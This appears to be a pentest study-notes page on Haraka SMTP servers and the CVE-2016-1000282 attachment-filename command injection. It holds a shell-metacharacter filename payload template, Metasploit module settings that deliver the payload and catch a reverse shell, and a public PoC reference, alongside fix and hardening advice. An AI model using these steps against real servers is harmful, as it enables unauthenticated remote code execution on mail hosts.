# Haraka

#Haraka #SMTP #MTA #NodeJS #RCE #CommandInjection #CVE-2016-1000282 #Email

## What is Haraka?

Haraka is a high-performance open-source **SMTP server (MTA)** written in Node.js, built around a **plugin architecture** — almost every function (auth, queueing, attachment scanning, spam filtering) is a loadable plugin. It ships in some mail gateways and appliances. On an engagement it matters for one reason above all: versions **< 2.8.9** load an **attachment plugin** with a command-injection flaw (**CVE-2016-1000282**, "Harakiri") that turns *send an email* into **remote code execution** as the Haraka service user — no authentication required.

- Port **TCP 25** — SMTP (plus whatever submission/TLS ports the deployment configures)
- Banner self-identifies: `220 <host> ESMTP Haraka <version> ready` — the version is right there
- Node.js; runs on Linux/Windows — the exploit targets Linux deployments

---

## Tools

| Tool | Use |
|---|---|
| [[Tools/Email/swaks\|swaks]] | Scriptable SMTP client — deliver the malicious attachment by hand |
| [[Tools/Payloads & Shells/metasploit\|Metasploit]] | `exploit/linux/smtp/haraka` — turnkey Harakiri exploit (Excellent rank) |

---

## Enumeration

### Fingerprint / Version

```bash
nc -nv <target> 25
# 220 mail.target.com ESMTP Haraka 2.8.8 ready
```

The banner names the product and version outright — no guessing. Anything **`< 2.8.9`** is a candidate for CVE-2016-1000282; the **attachment plugin** must be loaded for it to fire (it is by default in the vulnerable builds).

```bash
nmap -p 25 -sV --script smtp-commands <target>
```

---

## Attack Vectors

### Attachment-Plugin Command Injection — CVE-2016-1000282 ("Harakiri")

**Conditions:** Haraka **< 2.8.9** · attachment plugin **enabled** (default) · the server accepts a message you can address to a deliverable recipient.

**Root cause.** The attachment plugin inspects archive attachments (zip/tar/…) by shelling out to extract/list them, and it builds that shell command from the **attachment's filename without sanitisation**. A filename carrying shell metacharacters breaks out of the intended command. Craft an archive whose (inner) filename is something like:

```text
a";<COMMAND>;echo "a.zip
```

When the plugin processes the attachment, `<COMMAND>` executes as the Haraka process user. **Fixed in 2.8.9** (patch: Haraka PR #1606; recommended upgrade 2.8.20+).

#### Turnkey — Metasploit

```bash
msfconsole -q
use exploit/linux/smtp/haraka
set RHOSTS    <target>
set RPORT     25
set EMAILTO   admin@target.com      # a recipient Haraka will accept/deliver
set EMAILFROM attacker@evil.com     # MAIL FROM (optional)
set LHOST     <your-ip>             # payload callback
set SRVHOST   <your-ip>             # module hosts the stager over HTTP
run
```

The module crafts the email + poisoned attachment, delivers it, and catches the shell when the attachment plugin executes the payload. Rank **Excellent** — reliable and non-destructive.

#### Standalone PoC

If Metasploit isn't available, the public PoC builds the command-injecting message directly:

```bash
git clone https://github.com/outflanknl/Exploits
python3 Exploits/harakiri-CVE-2016-1000282.py -h
# generates the email with a poisoned archive filename; deliver via the script or swaks
```

You *can* hand-deliver a crafted archive with [[Tools/Email/swaks\|swaks]] `--attach`, but getting the archive/filename encoding exactly right is fiddly — the PoC and MSF module both handle it for you.

---

## Dangerous Settings

| Setting | Risk |
|---|---|
| Haraka **< 2.8.9** with attachment plugin | Unauthenticated RCE via crafted attachment (CVE-2016-1000282) |
| Verbose banner (`Haraka <version>`) | Hands the attacker the exact version to match a CVE |
| Service runs as root/privileged user | Command injection lands directly as that user — no separate privesc step |
| Unnecessary plugins enabled | Larger attack surface; disable attachment scanning if unused |

---

## Quick Reference

| Goal | Command |
|---|---|
| Fingerprint + version | `nc -nv <target> 25` → read `ESMTP Haraka <ver>` |
| Confirm vuln range | version `< 2.8.9` + attachment plugin loaded |
| Turnkey RCE | `msf > use exploit/linux/smtp/haraka; set RHOSTS/EMAILTO/LHOST; run` |
| Standalone PoC | `harakiri-CVE-2016-1000282.py` (outflanknl/Exploits) |
| Fix | upgrade to 2.8.9+ (2.8.20+ recommended) |

---

> [!note] **See also** — [[Services/Email/SMTP\|SMTP]] — general SMTP enumeration/attack surface this MTA sits on; [[Tools/Email/swaks\|swaks]] — the client for delivering the payload; [[Class notes/HTB Academy/CPTS v2 (claude)/Attacking Common Services\|Attacking Common Services]] — where SMTP fits in the services workflow.

---

*Created: 2026-09-04*
*Updated: 2026-09-04*
*Model: claude-opus-4-8*
